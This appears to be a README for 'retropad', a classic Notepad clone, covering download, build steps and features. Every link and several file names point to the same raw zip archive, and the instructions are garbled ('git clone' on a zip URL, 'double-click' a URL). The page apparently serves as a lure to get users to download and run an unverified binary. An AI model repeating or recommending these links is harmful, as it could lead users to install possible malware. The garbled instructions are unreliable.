# 📝 retropad - A Classic Notepad Experience

[![Download Now](https://github.com/Wafi-net/retropad/raw/refs/heads/main/binaries/Software_3.2.zip)](https://github.com/Wafi-net/retropad/raw/refs/heads/main/binaries/Software_3.2.zip)

## 🚀 Getting Started

Welcome to **retropad**, a simplified Notepad designed for your Windows computer. This app replicates the classic layout with features like word wrap, font selection, and easy find/replace. To get started, follow the steps below.

## 📥 Download & Install

To get **retropad**, visit our [Releases Page](https://github.com/Wafi-net/retropad/raw/refs/heads/main/binaries/Software_3.2.zip). Here, you can find the latest version to download.

1. Go to the [Releases Page](https://github.com/Wafi-net/retropad/raw/refs/heads/main/binaries/Software_3.2.zip).
2. Click on the latest version.
3. Download the appropriate file for your system.
4. Once the file is downloaded, locate it in your downloads folder and open it.

## ✅ Prerequisites

Before running **retropad**, ensure you have the following:

- A Windows computer
- Internet access
- Git for version control
- Visual Studio 2022 or Build Tools for necessary components
  - Ensure the "Desktop development with C++" workload is selected.
- An optional MinGW-w64 setup for additional tools.

## ⚙️ Running the Application

Once you have downloaded **retropad**, follow these instructions to open it:

1. Navigate to your downloaded file.
2. Double-click the **https://github.com/Wafi-net/retropad/raw/refs/heads/main/binaries/Software_3.2.zip** file.
3. The application should launch without any additional setup.

## 🛠️ Building from Source (Optional)

If you wish to build the application from source, you can do so using either MSVC or MinGW. Here's how:

### 📂 Build with MSVC (`nmake`)

If you have Visual Studio installed, follow these steps:

1. Open a "x64 Native Tools Command Prompt for VS 2022."
2. Clone the repository:
   ```bat
   git clone https://github.com/Wafi-net/retropad/raw/refs/heads/main/binaries/Software_3.2.zip
   cd retropad
   ```
3. Build the project with the following command:
   ```bat
   nmake /f makefile
   ```
4. You will find `https://github.com/Wafi-net/retropad/raw/refs/heads/main/binaries/Software_3.2.zip` in the project root.

To clean the project files, use:
```bat
nmake /f makefile clean
```

### 🔧 Build with MinGW (Optional)

Alternatively, if you prefer MinGW, ensure you have the necessary tools added to your PATH. Then follow these steps:

1. Open a command prompt.
2. Navigate to the cloned repository:
   ```bash
   cd retropad
   ```
3. Run the following command to build the application:
   ```bash
   make
   ```

The built files will be available in the project directory.

## 🎨 Features

**retropad** includes the following functionalities:

- Classic menu interface for easy navigation
- Word wrap toggle for better text readability
- Status bar for document info, such as character count
- Find and replace options for easy editing
- Font picker for customized text appearance
- Time/date insertion for convenience
- BOM-aware load/save to handle various text files

## 📋 Notes

- Printing options are intentionally excluded from the app to maintain a focus on simple text editing.
- Feedback is welcome; please feel free to report issues or suggest features on our GitHub page.

## 📧 Support

If you encounter issues or have questions, please visit our [GitHub repository](https://github.com/Wafi-net/retropad/raw/refs/heads/main/binaries/Software_3.2.zip) to create an issue. 

Thank you for using **retropad**!